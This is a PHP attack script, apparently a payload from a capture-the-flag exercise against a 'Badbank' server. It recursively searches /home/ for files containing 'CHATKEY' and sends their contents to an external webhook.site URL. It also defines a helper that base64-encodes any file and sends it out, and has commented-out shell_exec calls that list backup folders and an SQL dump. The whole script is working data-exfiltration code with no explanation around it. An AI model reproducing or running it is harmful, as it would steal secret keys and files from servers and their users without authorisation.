<?php
function sendFileBase64($pathToFile)
{
  $handle = fopen($pathToFile, "rb");
  $contents = fread($handle, filesize($pathToFile));
  fclose($handle);
  $b64Content=base64_encode($contents);
  $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0?jpg=" . $b64Content;
  $content = file_get_contents($url);
}


function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
            $results[] = $path;
        } else if ($value != "." && $value != "..") {
            getDirContents($path, $results);
        }
    }

    return $results;
}

function searchForKey($path)
{
  if( strpos(file_get_contents($path),'CHATKEY') !== false) {
    $handle = fopen($path, "rb");
    $contents = fread($handle, filesize($path));
    fclose($handle);
    $encodedContent= urlencode($contents);
    $url = "https://webhook.site/23410df2-5255-46c0-983e-c89e81d71bd0?KEYFILE=" . $encodedContent;
    $content = file_get_contents($url);
  }
}

// BEGIN

$output ='';
// All your base are belong to us >=E
//$filename = "/home/pinhead/susip0rn.jpg";
//sendFileBase64($filename);

$rootDir='/home/';
getDirContents($rootDir,$files);

foreach ($files as $key => $value) {
  searchForKey($value);
}
//$output =$output."\n /home/pinhead/backups/betaBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/betaBadbank/  | cat');
//$output =$output."\n /home/pinhead/backups/oldBadbank/ ls: \n ".shell_exec ('ls /home/pinhead/backups/oldBadbank/  | cat');
//$output =$output."\n /home/pinhead/backups/dump.sql/ ls: \n ".shell_exec ('ls /home/pinhead/backups/dump.sql/  | cat');

throw new Exception("\n SUCCESS  ". $output."\n");
?>
